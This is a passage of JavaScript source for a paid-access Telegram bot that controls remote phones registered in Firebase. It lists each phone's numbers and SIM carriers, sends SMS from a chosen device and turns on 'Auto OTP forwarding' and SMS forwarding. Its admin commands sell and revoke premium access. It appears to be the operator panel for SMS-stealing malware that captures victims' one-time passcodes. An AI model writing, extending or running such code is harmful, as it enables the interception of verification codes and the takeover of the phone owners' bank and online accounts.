    if (args.length > 1) {
        const deviceInput = args[1];
        console.log(`🔍 Searching for device: ${deviceInput}`);
        
        const allDevices = await getAllDevices(userId);
        if (allDevices.length === 0) {
            return ctx.reply('❌ No devices found in Firebase!\n\nMake sure devices are connected.', { parse_mode: 'Markdown' });
        }
        
        let foundDevice = null;
        
        const onlineDevices = allDevices.filter(d => d.online === true);
        const offlineDevices = allDevices.filter(d => d.online === false);
        
        foundDevice = onlineDevices.find(d => d.id === deviceInput);
        if (!foundDevice) {
            foundDevice = onlineDevices.find(d => 
                d.name.toLowerCase().includes(deviceInput.toLowerCase()) ||
                d.id.toLowerCase().includes(deviceInput.toLowerCase())
            );
        }
        
        if (!foundDevice) {
            foundDevice = offlineDevices.find(d => d.id === deviceInput);
            if (!foundDevice) {
                foundDevice = offlineDevices.find(d => 
                    d.name.toLowerCase().includes(deviceInput.toLowerCase()) ||
                    d.id.toLowerCase().includes(deviceInput.toLowerCase())
                );
            }
        }
        
        if (!foundDevice) {
            let deviceList = '📱 *Available Devices (ONLINE FIRST):*\n\n';
            
            if (onlineDevices.length > 0) {
                deviceList += '🟢 *ONLINE DEVICES:*\n';
                onlineDevices.slice(0, 5).forEach(d => {
                    deviceList += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n\n`;
                });
            }
            
            if (offlineDevices.length > 0) {
                deviceList += '🔴 *OFFLINE DEVICES:*\n';
                offlineDevices.slice(0, 3).forEach(d => {
                    deviceList += `• ${d.name}\n  🆔 \`${d.id}\`\n\n`;
                });
            }
            
            return ctx.reply(`❌ Device "${deviceInput}" not found!\n\n${deviceList}`, { parse_mode: 'Markdown' });
        }
        
        const device = await getDevice(userId, foundDevice.id);
        if (!device) return ctx.reply('❌ Device not found!', { parse_mode: 'Markdown' });
        
        user.monitoringDevice = device.id;
        userData.set(userId, user);
        saveUser(userId, user);
        
        return ctx.reply(
            `✅ *Device Set!*\n\n` +
            `📱 Name: ${device.name}\n` +
            `🆔 ID: \`${device.id}\`\n` +
            `📞 Phone: ${device.phone}\n` +
            `🔋 Battery: ${device.battery}\n` +
            `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE (but will still try to send)'}\n` +
            `📱 SIM1: ${device.sim1Number} (${device.sim1Carrier})\n` +
            `${device.sim2Number !== 'N/A' ? `📱 SIM2: ${device.sim2Number} (${device.sim2Carrier})\n` : ''}` +
            `\n*Note:* Commands will be sent even if device shows offline!`,
            { parse_mode: 'Markdown' }
        );
    }
    
    const allDevices = await getAllDevices(userId);
    if (allDevices.length === 0) {
        return ctx.reply('📭 *No devices found in Firebase!*\n\nMake sure devices are connected.', { parse_mode: 'Markdown' });
    }
    
    const sortedDevices = [...allDevices].sort((a, b) => (b.online ? 1 : 0) - (a.online ? 1 : 0));
    user.deviceList = sortedDevices;
    user.currentPage = 0;
    userData.set(userId, user);
    saveUser(userId, user);
    
    await showDevicePage(ctx, userId, 0);
});

async function showDevicePage(ctx, userId, page) {
    const user = userData.get(userId);
    if (!user || !user.deviceList) return;
    
    const devices = user.deviceList;
    const itemsPerPage = 10;
    const totalPages = Math.ceil(devices.length / itemsPerPage);
    const start = page * itemsPerPage;
    const end = start + itemsPerPage;
    const pageDevices = devices.slice(start, end);
    
    const onlineCount = devices.filter(d => d.online === true).length;
    
    let text = `📱 *DEVICES* (Page ${page + 1}/${totalPages})\n`;
    text += `🟢 Online: ${onlineCount} | 🔴 Offline: ${devices.length - onlineCount}\n\n`;
    text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    
    for (const d of pageDevices) {
        text += `${d.online ? '🟢' : '🔴'} *${d.name}*\n`;
        text += `   🆔 \`${d.id.slice(0, 20)}...\`\n`;
        text += `   📞 ${d.phone}\n`;
        text += `   🔋 ${d.battery}\n`;
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    }
    
    text += `\n⚠️ *Note:* Commands will be sent even if device shows offline!`;
    
    const buttons = [];
    
    for (const d of pageDevices) {
        buttons.push([{ text: `${d.online ? '🟢' : '🔴'} ${d.name.slice(0, 20)}`, callback_data: `select_dev_${d.id}` }]);
    }
    
    const navButtons = [];
    if (page > 0) {
        navButtons.push({ text: '◀️ PREV', callback_data: `dev_page_${page - 1}` });
    }
    if (page < totalPages - 1) {
        navButtons.push({ text: 'NEXT ▶️', callback_data: `dev_page_${page + 1}` });
    }
    if (navButtons.length > 0) {
        buttons.push(navButtons);
    }
    
    buttons.push([{ text: '❌ CANCEL', callback_data: 'cancel_select' }]);
    
    await ctx.reply(text, {
        reply_markup: { inline_keyboard: buttons },
        parse_mode: 'Markdown'
    });
}

bot.command('addchannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    let channelId = null;
    let chatTitle = 'Unknown';
    
    if (args.length > 1) {
        channelId = args[1];
        chatTitle = `Chat ${channelId}`;
    } else if (ctx.chat.type === 'channel' || ctx.chat.type === 'supergroup' || ctx.chat.type === 'group') {
        channelId = ctx.chat.id.toString();
        chatTitle = ctx.chat.title || ctx.chat.username || 'Chat';
    } else {
        await ctx.reply(
            `❌ *How to add channel/group:*\n\n` +
            `• By ID: \`/addchannel -1003937717807\`\n` +
            `• Or send \`/addchannel\` IN the channel/group\n\n` +
            `💡 Your Chat ID: \`${ctx.chat.id}\``,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const user = userData.get(userId);
    if (!user.channels) user.channels = [];
    
    if (user.channels.includes(channelId)) {
        return ctx.reply(`ℹ️ Chat \`${channelId}\` already monitored.`, { parse_mode: 'Markdown' });
    }
    
    user.channels.push(channelId);
    user.channelNames = user.channelNames || {};
    user.channelNames[channelId] = chatTitle;
    userData.set(userId, user);
    saveUser(userId, user);
    
    console.log(`✅ User ${userId} added chat: ${channelId} (${chatTitle})`);
    console.log(`📋 Total chats: ${user.channels.length}`);
    
    await ctx.reply(
        `✅ *Chat Added!*\n\n` +
        `📢 Name: ${chatTitle}\n` +
        `🆔 ID: \`${channelId}\`\n` +
        `📊 Total monitored chats: ${user.channels.length}\n\n` +
        `⚠️ Make bot **ADMIN** in the chat!\n` +
        `📌 Next: \`/startmonitor\``,
        { parse_mode: 'Markdown' }
    );
});

bot.command('listchannels', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    if (!user?.channels?.length) {
        await ctx.reply('📭 No channels/groups added.\n\nUse `/addchannel` in the chat or `/addchannel <chat_id>`', { parse_mode: 'Markdown' });
        return;
    }
    
    let text = '📢 *MONITORED CHATS*\n\n━━━━━━━━━━━━━━━━━━━\n';
    user.channels.forEach((ch, i) => { 
        const name = user.channelNames?.[ch] || 'Unknown';
        text += `${i+1}. ${name}\n   🆔 \`${ch}\`\n\n`;
    });
    text += `━━━━━━━━━━━━━━━━━━━\n📊 Total: ${user.channels.length} chats`;
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command('removechannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.channels?.length) return ctx.reply('📭 No chats to remove.');
    if (args.length < 2) return ctx.reply('Usage: `/removechannel <chat_id>`\n\nUse `/listchannels` to see IDs', { parse_mode: 'Markdown' });
    
    const idx = user.channels.indexOf(args[1]);
    if (idx === -1) return ctx.reply('❌ Chat not found.\n\nUse `/listchannels` to see all monitored chats.', { parse_mode: 'Markdown' });
    
    const removed = user.channels.splice(idx, 1)[0];
    if (user.channelNames) delete user.channelNames[removed];
    userData.set(userId, user);
    saveUser(userId, user);
    
    await ctx.reply(`✅ *Removed Chat!*\n\n🆔 \`${removed}\`\n📊 Remaining: ${user.channels.length} chats`, { parse_mode: 'Markdown' });
});

bot.command('startmonitor', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const user = userData.get(userId);
    
    if (!user?.firebaseUrl) return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    if (!user.monitoringDevice) return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
    if (!user.channels?.length) return ctx.reply('❌ No chats!\n\nUse `/addchannel` in a channel/group', { parse_mode: 'Markdown' });
    
    const now = new Date();
    user.monitorStartTime = now.toISOString();
    user.monitorActive = true;
    user.processedMsgs = new Set();
    user.processedSmsIds = new Set();
    userData.set(userId, user);
    saveUser(userId, user);
    
    const device = await getDevice(userId, user.monitoringDevice);
    const deviceStatus = device ? (device.online ? '🟢 ONLINE' : '🔴 OFFLINE') : '❓ Unknown';
    
    console.log(`\n✅ MONITORING STARTED for user ${userId}`);
    console.log(`Device: ${user.monitoringDevice} (${deviceStatus})`);
    console.log(`Total Chats: ${user.channels.length}`);
    console.log(`Chats: ${JSON.stringify(user.channels)}`);
    console.log(`Time: ${now.toLocaleString()}\n`);
    
    // Start SMS monitoring
    startSmsMonitoring(userId);
    
    let chatList = '';
    user.channels.slice(0, 5).forEach(ch => {
        const name = user.channelNames?.[ch] || 'Unknown';
        chatList += `   • ${name}\n`;
    });
    if (user.channels.length > 5) chatList += `   • +${user.channels.length - 5} more chats\n`;
    
    let forwardInfo = 'Not set';
    if (user.forwardNumber) {
        forwardInfo = `📞 ${user.forwardNumber}`;
    }
    
    await ctx.reply(
        `✅ *MONITORING STARTED!*\n\n` +
        `📱 Device: \`${user.monitoringDevice}\`\n` +
        `📡 Device Status: ${deviceStatus}\n` +
        `📢 Monitored Chats: ${user.channels.length}\n` +
        `${chatList}\n` +
        `🕐 Started: ${now.toLocaleString()}\n\n` +
        `⚠️ *IMPORTANT:* Commands will be sent even if device shows offline!\n` +
        `🚀 Token forwarding ACTIVE!\n` +
        `📩 SMS forwarding ACTIVE!\n` +
        `📞 Auto OTP Forward: ${forwardInfo}\n\n` +
        `📝 *Supported Formats:*\n` +
        `• To: +91XXXXX\\nMessage: TEXT\n` +
        `• 📱 Receipt: XXXXX\\n🔑 Token: TEXT\n` +
        `• Receipt: XXXXX\\nToken: TEXT`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('stop', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    if (userData.has(userId)) {
        userData.get(userId).monitorActive = false;
        saveUser(userId, userData.get(userId));
        console.log(`⏸ User ${userId} stopped monitoring`);
        stopSmsMonitoring(userId);
    }
    await ctx.reply(`⏸ *Monitor Paused*\n\nUse \`/resume\` to start.`, { parse_mode: 'Markdown' });
});

bot.command('resume', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const user = userData.get(userId);
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
    user.monitorActive = true;
    saveUser(userId, user);
    startSmsMonitoring(userId);
    
    await ctx.reply(`✅ *Monitor Resumed!*`, { parse_mode: 'Markdown' });
});

bot.command('status', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const user = userData.get(userId);
    if (!user) return ctx.reply('❌ Not configured. Use `/setfirebase` first.', { parse_mode: 'Markdown' });
    
    const devices = await getOnlineDevices(userId);
    const allDevices = await getAllDevices(userId);
    let deviceInfo = 'Not set';
    let deviceStatus = 'Unknown';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) {
            deviceInfo = `${d.name}`;
            deviceStatus = d.online ? '🟢 ONLINE' : '🔴 OFFLINE';
        }
    }
    
    let premiumStatus = isPremium(userId) ? '🟢 PREMIUM' : '🔴 FREE';
    if (botData.globalFreeMode) premiumStatus += ' (FREE MODE ACTIVE)';
    
    let forwardInfo = 'Not set';
    if (user.forwardNumber) {
        forwardInfo = `📞 ${user.forwardNumber}`;
    }
    
    await ctx.reply(
        `📊 *STATUS*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `💎 Premium: ${premiumStatus}\n` +
        `📡 Firebase: ✅ Connected\n` +
        `📱 Device: ${deviceInfo}\n` +
        `📡 Status: ${deviceStatus}\n` +
        `📢 Chats: ${user.channels?.length || 0}\n` +
        `🖥 Total Devices: ${allDevices.length}\n` +
        `🟢 Online: ${devices.length}\n` +
        `⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `📞 Auto Forward: ${forwardInfo}\n` +
        `🕐 Started: ${user.monitorStartTime ? new Date(user.monitorStartTime).toLocaleString() : 'Not started'}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `⚠️ *Note:* SMS will be sent even if device shows offline!`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('online', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const user = userData.get(userId);
    if (!user?.firebaseUrl) return ctx.reply('❌ Use `/setfirebase` first.', { parse_mode: 'Markdown' });
    
    const devices = await getOnlineDevices(userId);
    if (devices.length === 0) return ctx.reply('📭 No online devices!\n\nBut commands will still be sent to offline devices.', { parse_mode: 'Markdown' });
    
    let text = '🟢 *ONLINE DEVICES*\n\n━━━━━━━━━━━━━━━━━━━\n';
    for (const d of devices) {
        text += `📱 *${d.name}*\n`;
        text += `   📞 ${d.phone}\n`;
        text += `   🔋 ${d.battery}\n`;
        text += `   🆔 \`${d.id}\`\n`;
        text += `━━━━━━━━━━━━━━━━━━━\n`;
    }
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command('send', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.', { parse_mode: 'Markdown' });
    if (args.length < 3) return ctx.reply('❌ Usage: `/send <number> <message>`\n\nExample: `/send 918955562885 Hello`', { parse_mode: 'Markdown' });
    
    const phone = args[1];
    const message = args.slice(2).join(' ');
    
    const msg = await ctx.reply(`📤 Sending to \`${phone}\`...`, { parse_mode: 'Markdown' });
    const result = await sendSms(userId, user.monitoringDevice, phone, message);
    
    await ctx.telegram.editMessageText(
        msg.chat.id, msg.message_id, null,
        result.success ? `✅ ${result.message} (${result.elapsed}ms)\n🆔 ${result.commandId}` : `❌ Failed: ${result.error}`
    );
});

// ==================== ADMIN PREMIUM COMMANDS ====================
bot.command('pre', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Admin only command!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply(
            `❌ *Usage:* \`/pre <user_id> <days>\`\n\n` +
            `Example: \`/pre 8472456673 30\` (gives 30 days premium)\n\n` +
            `📌 Use \`/prelist\` to see all premium users\n` +
            `📌 Use \`/unlock\` to activate free mode for 5 hours`,
            { parse_mode: 'Markdown' }
        );
    }
    
    const targetId = args[1];
    const days = parseInt(args[2]);
    
    if (isNaN(days) || days <= 0) {
        return ctx.reply('❌ Invalid days! Use a positive number.', { parse_mode: 'Markdown' });
    }
    
    if (!userData.has(targetId)) {
        userData.set(targetId, {});
    }
    
    const user = userData.get(targetId);
    const premiumUntil = Date.now() + (days * 24 * 60 * 60 * 1000);
    user.premiumUntil = premiumUntil;
    user.isPremium = true;
    userData.set(targetId, user);
    saveUser(targetId, user);
    
    await ctx.reply(
        `✅ *Premium Activated!*\n\n` +
        `👤 User: \`${targetId}\`\n` +
        `📆 Duration: ${days} days\n` +
        `📅 Expires: ${new Date(premiumUntil).toLocaleString()}\n\n` +
        `User can now use all bot features!`,
        { parse_mode: 'Markdown' }
    );
    
    try {
        await bot.telegram.sendMessage(
            targetId,
            `🎉 *PREMIUM ACTIVATED!*\n\n` +
            `Your premium access has been activated for ${days} days!\n\n` +
            `💎 *Features:*\n` +
            `• Auto token forwarding\n` +
            `• Auto OTP forwarding\n` +
            `• SMS sending\n` +
            `• 24/7 monitoring\n` +
            `• Priority support\n\n` +
            `Use /premium to check your status!`,
            { parse_mode: 'Markdown' }
        );
    } catch(e) {}
});

bot.command('unlock', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Admin only command!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    
    if (botData.globalFreeMode) {
        botData.globalFreeMode = false;
        botData.freeModeEndTime = null;
        saveData();
        
        await ctx.reply(
            `🔓 *FREE MODE DISABLED!*\n\n` +
            `Bot is back to premium-only mode.\n` +
            `Users now need premium access to use the bot.`,
            { parse_mode: 'Markdown' }
        );
        
        for (const [uid, user] of userData.entries()) {
            if (!isAdmin(uid) && !isPremium(uid)) {
                try {
                    await bot.telegram.sendMessage(
                        uid,
                        `🔒 *FREE MODE ENDED*\n\n` +
                        `The free access period has ended.\n` +
                        `Please contact admin to get premium access.\n\n` +
                        `Use /paid for more information.`,
                        { parse_mode: 'Markdown' }
                    );
                } catch(e) {}
            }
        }
    } else {
        botData.globalFreeMode = true;
        botData.freeModeEndTime = Date.now() + botData.freeModeDuration;
        saveData();
        
        const endTime = new Date(botData.freeModeEndTime);
        
        await ctx.reply(
            `🎉 *FREE MODE ACTIVATED!*\n\n` +
            `Bot is now FREE for ALL users!\n` +
            `⏱ Duration: 5 hours\n` +
            `📅 Ends at: ${endTime.toLocaleString()}\n\n` +
            `✅ All users can now use the bot without premium!`,
            { parse_mode: 'Markdown' }
        );
        
        for (const [uid, user] of userData.entries()) {
            try {
                await bot.telegram.sendMessage(
                    uid,
                    `🎉 *FREE MODE ACTIVATED!*\n\n` +
                    `The bot is now FREE for the next 5 hours!\n` +
                    `⏱ Ends at: ${endTime.toLocaleString()}\n\n` +
                    `Use all premium features for free!\n` +
                    `• Auto token forwarding\n` +
                    `• Auto OTP forwarding\n` +
                    `• SMS sending\n` +
                    `• 24/7 monitoring\n\n` +
                    `Enjoy! 🚀`,
                    { parse_mode: 'Markdown' }
                );
            } catch(e) {}
        }
    }
    
    if (botData.globalFreeMode && botData.freeModeEndTime) {
        setTimeout(async () => {
            if (botData.globalFreeMode && botData.freeModeEndTime && botData.freeModeEndTime <= Date.now()) {
                botData.globalFreeMode = false;
                botData.freeModeEndTime = null;
                saveData();
                
                console.log('🔒 Free mode auto-disabled after 5 hours');
                
                for (const adminId of botData.adminIds) {
                    try {
                        await bot.telegram.sendMessage(
                            adminId,
                            `🔒 *FREE MODE AUTO-DISABLED*\n\n` +
                            `5 hours free period has ended.\n` +
                            `Bot is back to premium-only mode.`,
                            { parse_mode: 'Markdown' }
                        );
                    } catch(e) {}
                }
            }
        }, botData.freeModeDuration);
    }
});

bot.command('prelist', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Admin only command!*', { parse_mode: 'Markdown' });
    }
    
    const premiumUsers = [];
    for (const [uid, user] of userData.entries()) {
        if (user.isPremium && user.premiumUntil > Date.now()) {
            premiumUsers.push({
                id: uid,
                expires: new Date(user.premiumUntil).toLocaleString(),
                daysLeft: Math.ceil((user.premiumUntil - Date.now()) / (24 * 60 * 60 * 1000))
            });
        }
    }
    
    if (premiumUsers.length === 0) {
        return ctx.reply('📭 No active premium users found.', { parse_mode: 'Markdown' });
    }
    
    let text = `💎 *PREMIUM USERS* (${premiumUsers.length})\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    premiumUsers.forEach((user, i) => {
        text += `${i+1}. *ID:* \`${user.id}\`\n`;
        text += `   📅 Expires: ${user.expires}\n`;
        text += `   ⏱ Days Left: ${user.daysLeft}\n`;
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    });
    
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command('removepre', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Admin only command!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: `/removepre <user_id>`', { parse_mode: 'Markdown' });
    }
    
    const targetId = args[1];
    
    if (!userData.has(targetId)) {
        return ctx.reply(`❌ User \`${targetId}\` not found.`, { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(targetId);
    user.isPremium = false;
    user.premiumUntil = null;
    userData.set(targetId, user);
    saveUser(targetId, user);
    
    await ctx.reply(`✅ *Premium Removed!*\n\n👤 User: \`${targetId}\``, { parse_mode: 'Markdown' });
    
    try {
        await bot.telegram.sendMessage(
            targetId,
            `🔴 *PREMIUM EXPIRED!*\n\n` +
            `Your premium access has been removed.\n` +
            `Contact admin to renew your subscription.\n\n` +
            `Use /paid for more information.`,
            { parse_mode: 'Markdown' }
        );
    } catch(e) {}
});

// ==================== ADMIN COMMANDS ====================
bot.command('admin', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    const freeModeStatus = botData.globalFreeMode ? `🟢 ACTIVE (ends ${new Date(botData.freeModeEndTime).toLocaleTimeString()})` : '🔴 INACTIVE';
    const premiumCount = Array.from(userData.values()).filter(u => u.isPremium && u.premiumUntil > Date.now()).length;
    
    const stylishAdmin = `
╔══════════════════════════════╗
║       👑  A D M I N   P A N E L   👑      ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃         📊 S T A T S            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Total Users: ${userData.size}
◈ Premium Users: ${premiumCount}
◈ Active Monitors: ${Array.from(userData.values()).filter(u => u.monitorActive).length}
◈ Free Mode: ${freeModeStatus}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃        💎 P R E M I U M        ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /pre <user_id> <days> ➜ Give premium
◈ /removepre <user_id> ➜ Remove premium
◈ /prelist ➜ List premium users
◈ /unlock ➜ Toggle free mode (5 hours)

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃        ⚙️ C O M M A N D S        ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /users ➜ List all users
◈ /ban <user_id> ➜ Ban user
◈ /unban <user_id> ➜ Unban user
◈ /broadcast <message> ➜ Send to all
◈ /stats ➜ Detailed stats

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await ctx.reply(stylishAdmin);
});

bot.command('users', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    if (userData.size === 0) {
        return ctx.reply('📭 No users found.');
    }
    
    let userList = '👥 *USER LIST*\n\n━━━━━━━━━━━━━━━━━━━\n';
    let index = 1;
    
    for (const [uid, user] of userData.entries()) {
        const status = user.banned ? '🔴 BANNED' : (user.monitorActive ? '🟢 ACTIVE' : '⚪ INACTIVE');
        const premium = isPremium(uid) ? '💎 PREMIUM' : '📀 FREE';
        userList += `${index}. *ID:* \`${uid}\`\n   📊 ${status} | ${premium}\n`;
        if (user.monitoringDevice) userList += `   📱 Device: ✓\n`;
        if (user.channels?.length) userList += `   📢 Chats: ${user.channels.length}\n`;
        if (user.forwardNumber) userList += `   📞 Forward: ${user.forwardNumber}\n`;
        userList += `━━━━━━━━━━━━━━━━━━━\n`;
        index++;
        
        if (index > 20) {
            userList += `\n📌 *Showing first 20 users*`;
            break;
        }
    }
    
    await ctx.reply(userList, { parse_mode: 'Markdown' });
});

bot.command('ban', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: `/ban <user_id>`\n\nExample: `/ban 8472456673`', { parse_mode: 'Markdown' });
    }
    
    const targetId = args[1];
    
    if (!userData.has(targetId)) {
        return ctx.reply(`❌ User \`${targetId}\` not found.`, { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(targetId);
    user.banned = true;
    user.monitorActive = false;
    userData.set(targetId, user);
    saveUser(targetId, user);
    
    await ctx.reply(`✅ *User Banned!*\n\n🆔 \`${targetId}\``, { parse_mode: 'Markdown' });
    
    try {
        await bot.telegram.sendMessage(targetId, `🔴 *You have been BANNED from using this bot!*`, { parse_mode: 'Markdown' });
    } catch(e) {}
});

bot.command('unban', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: `/unban <user_id>`\n\nExample: `/unban 8472456673`', { parse_mode: 'Markdown' });
    }
    
    const targetId = args[1];
    
    if (!userData.has(targetId)) {
        return ctx.reply(`❌ User \`${targetId}\` not found.`, { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(targetId);
    user.banned = false;
    userData.set(targetId, user);
    saveUser(targetId, user);
    
    await ctx.reply(`✅ *User Unbanned!*\n\n🆔 \`${targetId}\``, { parse_mode: 'Markdown' });
    
    try {
        await bot.telegram.sendMessage(targetId, `🟢 *You have been UNBANNED!*`, { parse_mode: 'Markdown' });
    } catch(e) {}
});

bot.command('broadcast', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: `/broadcast <message>`', { parse_mode: 'Markdown' });
    }
    
    const message = args.slice(1).join(' ');
    const msg = await ctx.reply(`📢 Broadcasting to ${userData.size} users...`);
    
    let success = 0;
    let failed = 0;
    
    for (const [uid, user] of userData.entries()) {
        if (user.banned) continue;
        try {
            await bot.telegram.sendMessage(uid, `📢 *ANNOUNCEMENT*\n\n${message}`, { parse_mode: 'Markdown' });
            success++;
        } catch(e) {
            failed++;
        }
        await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    await ctx.telegram.editMessageText(
        msg.chat.id, msg.message_id, null,
        `✅ *Broadcast Complete!*\n\n✅ Sent: ${success}\n❌ Failed: ${failed}`
    );
});

bot.command('stats', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    let totalChannels = 0;
    let activeUsers = 0;
    let bannedUsers = 0;
    let premiumUsers = 0;
    
    for (const [uid, user] of userData.entries()) {
        if (user.banned) {
            bannedUsers++;
            continue;
        }
        if (user.monitorActive) activeUsers++;
        if (user.channels) totalChannels += user.channels.length;
        if (isPremium(uid)) premiumUsers++;
    }
    
    const stats = `
╔══════════════════════════════╗
║       📊  D E T A I L E D   S T A T S    ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃         👥 U S E R S           ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Total Users: ${userData.size}
◈ Active Users: ${activeUsers}
◈ Banned Users: ${bannedUsers}
◈ Premium Users: ${premiumUsers}
◈ Free Users: ${userData.size - bannedUsers - premiumUsers}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃         📊 C H A T S          ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Total Chats: ${totalChannels}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃         💎 P R E M I U M       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Free Mode: ${botData.globalFreeMode ? '🟢 ACTIVE' : '🔴 INACTIVE'}
${botData.globalFreeMode && botData.freeModeEndTime ? `◈ Ends: ${new Date(botData.freeModeEndTime).toLocaleString()}` : ''}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await ctx.reply(stats);
});

bot.command('help', async (ctx) => {
    const userId = ctx.from.id.toString();
    const isAdminUser = isAdmin(userId);
    
    let helpText = `
╔══════════════════════════════╗
║      ⚡  C O M M A N D S   L I S T    ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       🔧 S E T U P             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /setfirebase <url>
◈ /setdevice (or /setdevice <name>)
◈ /addchannel (in your chat)
